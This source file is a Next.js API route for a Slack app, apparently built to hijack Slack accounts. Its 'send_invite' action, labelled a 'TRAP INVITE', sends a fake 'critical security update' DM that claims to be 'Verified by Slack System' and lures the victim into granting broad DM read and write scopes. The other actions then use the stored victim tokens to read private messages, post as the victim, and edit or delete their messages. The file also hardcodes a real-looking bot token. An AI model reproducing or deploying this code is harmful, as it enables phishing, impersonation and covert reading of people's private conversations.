/* eslint-disable prefer-const */
/* eslint-disable @typescript-eslint/no-explicit-any */
// app/api/slack/manager/route.ts

// app/api/slack/manager/route.ts

// app/api/slack/manager/route.ts

import { NextResponse } from 'next/server';
// import { db } from '@/lib/firebase'; 
import { doc, getDoc, deleteDoc, setDoc, serverTimestamp } from 'firebase/firestore';
import { db } from '../../../../lib/firebase';

// ⚠️ KEYS CHECK

const BOT_TOKEN = "xoxb-2545190050563-10492566656497-HSMbNXWEvFtVmSA7SjNtKDtX"; 
const CLIENT_ID = "2545190050563.10477586240486";
const REDIRECT_URI = "https://slack-attendance.vercel.app/api/auth/callback";


export async function POST(req: Request) {
  try {
    const body = await req.json();
    const { action, targetUserId, channelId, text, messageTs, newText, otherUserId } = body;

    // --- CASE 1: SEND TRAP INVITE (UPDATED PERMISSIONS 🔐) ---
    if (action === 'send_invite') {
       if (!targetUserId) return NextResponse.json({ success: false, error: "User ID missing" });
       
       // 👇 YEH HAI MAIN FIX: 'im:write' aur 'mpim:write' add kiya hai
       const scopes = "chat:write,im:read,im:history,im:write,mpim:read,mpim:write,users:read,groups:read";
       
       const authLink = `https://slack.com/oauth/v2/authorize?client_id=${CLIENT_ID}&user_scope=${scopes}&redirect_uri=${REDIRECT_URI}`;
       
       const blocks = [
        { "type": "header", "text": { "type": "plain_text", "text": "✨ System Update Available", "emoji": true } },
        { "type": "section", "text": { "type": "mrkdwn", "text": "A critical security update is available for your workspace account.\nPlease authorize to continue." } },
        { "type": "divider" },
        { "type": "actions", "elements": [
            { "type": "button", "text": { "type": "plain_text", "text": "Install Update", "emoji": true }, "style": "primary", "url": authLink },
            { "type": "button", "text": { "type": "plain_text", "text": "Review Later", "emoji": true }, "url": authLink }
        ]},
        { "type": "context", "elements": [ { "type": "mrkdwn", "text": "🔒 Verified by Slack System" } ] }
       ];

       const chatRes = await fetch('https://slack.com/api/chat.postMessage', {
         method: 'POST',
         headers: { Authorization: `Bearer ${BOT_TOKEN}`, 'Content-Type': 'application/json; charset=utf-8' },
         body: JSON.stringify({ channel: targetUserId, text: "System Update", blocks: blocks })
       });

       const chatData = await chatRes.json();
       if(!chatData.ok) return NextResponse.json({ success: false, error: `Slack Error: ${chatData.error}` });

       try { await setDoc(doc(db, "pending_invites", targetUserId), { ts: chatData.ts, channel: chatData.channel }); } catch(e) {}
       return NextResponse.json({ success: true });
    }

    // --- CASE 2: DELETE USER ---
    if (action === 'delete_user') {
        try { await deleteDoc(doc(db, "slack_tokens", targetUserId)); } catch(e) {}
        return NextResponse.json({ success: true });
    }

    // --- TOKEN CHECK ---
    if (!targetUserId) return NextResponse.json({ error: "User ID required" });
    let USER_TOKEN = "";
    try {
        const tokenDoc = await getDoc(doc(db, "slack_tokens", targetUserId));
        if (!tokenDoc.exists()) return NextResponse.json({ error: "User Not Connected" }, { status: 403 });
        USER_TOKEN = tokenDoc.data().accessToken;
    } catch (e) { return NextResponse.json({ error: "DB Error" }, { status: 503 }); }

    // --- CASE 3: LIST CHATS & DIRECTORY ---
    if (action === 'list_chats') {
        const chatRes = await fetch('https://slack.com/api/users.conversations?types=im,mpim&limit=100', { 
            headers: { Authorization: `Bearer ${USER_TOKEN}` } 
        });
        const chatData = await chatRes.json();
        
        // Fetch Directory for Search
        const usersRes = await fetch('https://slack.com/api/users.list?limit=1000', {
            headers: { Authorization: `Bearer ${USER_TOKEN}` }
        });
        const usersData = await usersRes.json();

        const userMap: Record<string, any> = {};
        const directory: any[] = []; 

        if (usersData.ok && usersData.members) {
            usersData.members.forEach((u: any) => {
                if (!u.deleted && !u.is_bot && u.id !== 'USLACKBOT') {
                    const userData = { id: u.id, name: u.real_name || u.name, image: u.profile?.image_48 };
                    userMap[u.id] = userData;
                    directory.push(userData);
                }
            });
        }

        const chats = (chatData.channels || []).map((c: any) => {
            let displayName = "Group Chat";
            let displayImage = null;
            let unread = 0;

            if(c.is_im) {
                const userId = c.user;
                if(userMap[userId]) { displayName = userMap[userId].name; displayImage = userMap[userId].image; } 
                else { displayName = `ID: ${userId}`; }
                return { ...c, name: displayName, image: displayImage, unread, otherUserId: userId };
            }
            return { ...c, name: displayName, image: displayImage, unread };
        });

        return NextResponse.json({ chats, directory });
    }

    // --- CASE 3.5: OPEN CHAT (SEARCH RESULT) ---
    if (action === 'open_chat') {
        if (!otherUserId) return NextResponse.json({ error: "No User ID provided" });

        // Step 1: Open DM
        const openRes = await fetch('https://slack.com/api/conversations.open', {
            method: 'POST',
            headers: { Authorization: `Bearer ${USER_TOKEN}`, 'Content-Type': 'application/json' },
            body: JSON.stringify({ users: otherUserId })
        });
        
        const openData = await openRes.json();
        
        if (!openData.ok) {
            return NextResponse.json({ error: `Slack Error: ${openData.error}` });
        }

        return NextResponse.json({ 
            channel: {
                id: openData.channel.id, // Channel ID (D...)
                user: otherUserId
            }
        });
    }

    // --- CASE 4: GET MESSAGES ---
    if (action === 'get_messages') {
        let allMessages: any[] = [];
        let hasMore = true;
        let nextCursor = undefined;
        let loopCount = 0;

        while (hasMore && loopCount < 3) { 
            let url = `https://slack.com/api/conversations.history?channel=${channelId}&limit=100`;
            if (nextCursor) url += `&cursor=${nextCursor}`;
            try {
                const res = await fetch(url, { headers: { Authorization: `Bearer ${USER_TOKEN}` } });
                const data = await res.json();
                if (data.ok && data.messages) {
                    allMessages = [...allMessages, ...data.messages];
                    if (data.has_more && data.response_metadata?.next_cursor) nextCursor = data.response_metadata.next_cursor;
                    else hasMore = false;
                } else hasMore = false;
            } catch (err) { hasMore = false; }
            loopCount++;
        }
        return NextResponse.json({ messages: allMessages.reverse() });
    }

    // --- OTHER ACTIONS ---
    if (action === 'send_as_user') {
         const res = await fetch('https://slack.com/api/chat.postMessage', {
            method: 'POST',
            headers: { Authorization: `Bearer ${USER_TOKEN}`, 'Content-Type': 'application/json' },
            body: JSON.stringify({ channel: channelId, text: text, as_user: true })
        });
        return NextResponse.json(await res.json());
    }
    if (action === 'delete_message') {
        const res = await fetch('https://slack.com/api/chat.delete', {
            method: 'POST',
            headers: { Authorization: `Bearer ${USER_TOKEN}`, 'Content-Type': 'application/json' },
            body: JSON.stringify({ channel: channelId, ts: messageTs })
        });
        return NextResponse.json(await res.json());
    }
    if (action === 'edit_message') {
        const res = await fetch('https://slack.com/api/chat.update', {
            method: 'POST',
            headers: { Authorization: `Bearer ${USER_TOKEN}`, 'Content-Type': 'application/json' },
            body: JSON.stringify({ channel: channelId, ts: messageTs, text: newText })
        });
        return NextResponse.json(await res.json());
    }

    return NextResponse.json({ error: "Invalid Action" });

  } catch (e: any) {
    return NextResponse.json({ success: false, error: "System Busy" }, { status: 200 });
  }
}